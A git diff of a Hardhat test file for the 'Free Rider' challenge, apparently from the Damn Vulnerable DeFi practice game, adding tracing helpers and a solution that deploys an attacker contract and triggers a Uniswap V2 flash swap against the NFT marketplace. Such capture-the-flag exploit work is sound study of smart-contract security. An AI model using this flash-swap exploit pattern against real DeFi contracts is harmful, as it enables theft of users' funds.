@@ -3,9 +3,16 @@ const pairJson = require("@uniswap/v2-core/build/UniswapV2Pair.json");
 const factoryJson = require("@uniswap/v2-core/build/UniswapV2Factory.json");
 const routerJson = require("@uniswap/v2-periphery/build/UniswapV2Router02.json");
 
-const { ethers } = require('hardhat');
+const { ethers, tracer } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+
+const fs = require('fs');
+
+function setTracerTag(addr, name) {
+    if (tracer)
+        tracer.nameTags[addr] = name;
+}
 
 describe('[Challenge] Free Rider', function () {
     let deployer, player, devs;
@@ -15,7 +22,7 @@ describe('[Challenge] Free Rider', function () {
     const NFT_PRICE = 15n * 10n ** 18n;
     const AMOUNT_OF_NFTS = 6;
     const MARKETPLACE_INITIAL_ETH_BALANCE = 90n * 10n ** 18n;
-    
+
     const PLAYER_INITIAL_ETH_BALANCE = 1n * 10n ** 17n;
 
     const BOUNTY = 45n * 10n ** 18n;
@@ -26,7 +33,20 @@ describe('[Challenge] Free Rider', function () {
 
     before(async function () {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+
+        // hack: copy the library ABIs & bytecodes into the artifact dir so that
+        // hardhat-tracer can recognize these contracts whose source code is absent
+        if (tracer) {
+            try { fs.mkdirSync('artifacts/uniswap-v2'); } catch {}
+            fs.copyFileSync('node_modules/@uniswap/v2-core/build/UniswapV2Pair.json', 'artifacts/uniswap-v2/UniswapV2Pair.json');
+            fs.copyFileSync('node_modules/@uniswap/v2-core/build/UniswapV2Factory.json', 'artifacts/uniswap-v2/UniswapV2Factory.json');
+            fs.copyFileSync('node_modules/@uniswap/v2-periphery/build/UniswapV2Router02.json', 'artifacts/uniswap-v2/UniswapV2Router02.json');
+        }
+
         [deployer, player, devs] = await ethers.getSigners();
+        setTracerTag(deployer.address, "Deployer");
+        setTracerTag(player.address, "Player");
+        setTracerTag(devs.address, "Devs");
 
         // Player starts with limited ETH balance
         setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE);
@@ -46,7 +66,7 @@ describe('[Challenge] Free Rider', function () {
             uniswapFactory.address,
             weth.address
         );
-        
+
         // Approve tokens, and then create Uniswap v2 pair against WETH and add liquidity
         // The function takes care of deploying the pair automatically
         await token.approve(
@@ -62,9 +82,9 @@ describe('[Challenge] Free Rider', function () {
             (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
             { value: UNISWAP_INITIAL_WETH_RESERVE }
         );
-        
+
         // Get a reference to the created Uniswap pair
-        uniswapPair = await (new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer)).attach(
+        uniswapPair = (new ethers.ContractFactory(pairJson.abi, pairJson.bytecode, deployer)).attach(
             await uniswapFactory.getPair(token.address, weth.address)
         );
         expect(await uniswapPair.token0()).to.eq(weth.address);
@@ -79,7 +99,7 @@ describe('[Challenge] Free Rider', function () {
         );
 
         // Deploy NFT contract
-        nft = await (await ethers.getContractFactory('DamnValuableNFT', deployer)).attach(await marketplace.token());
+        nft = (await ethers.getContractFactory('DamnValuableNFT', deployer)).attach(await marketplace.token());
         expect(await nft.owner()).to.eq(ethers.constants.AddressZero); // ownership renounced
         expect(await nft.rolesOf(marketplace.address)).to.eq(await nft.MINTER_ROLE());
 
@@ -99,13 +119,36 @@ describe('[Challenge] Free Rider', function () {
         // Deploy devs' contract, adding the player as the beneficiary
         devsContract = await (await ethers.getContractFactory('FreeRiderRecovery', devs)).deploy(
             player.address, // beneficiary
-            nft.address, 
+            nft.address,
             { value: BOUNTY }
         );
     });
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        console.log("\n=== Exploit Begin ===\n");
+
+        const attackerContract = await
+            (await ethers.getContractFactory('FreeRiderAttacker', player)).deploy();
+
+        // borrow WETHs via flash swap:
+        // https://docs.uniswap.org/contracts/v2/guides/smart-contract-integration/using-flash-swaps
+        let amount0 = ethers.utils.parseEther('15'); // WETH
+        let amount1 = 0; // DVT
+        if (weth.address > token.address)
+            [amount0, amount1] = [amount1, amount0];
+        await uniswapPair.connect(player).swap(
+            amount0,
+            amount1,
+            attackerContract.address, // to
+            ethers.utils.defaultAbiCoder.encode(
+                ['address', 'address', 'address'],
+                [nft.address, marketplace.address, devsContract.address]
+            ), // calldata
+            { gasLimit: 1e6 }
+        );
+
+        console.log('\n=== Exploit End ===\n');
     });
 
     after(async function () {
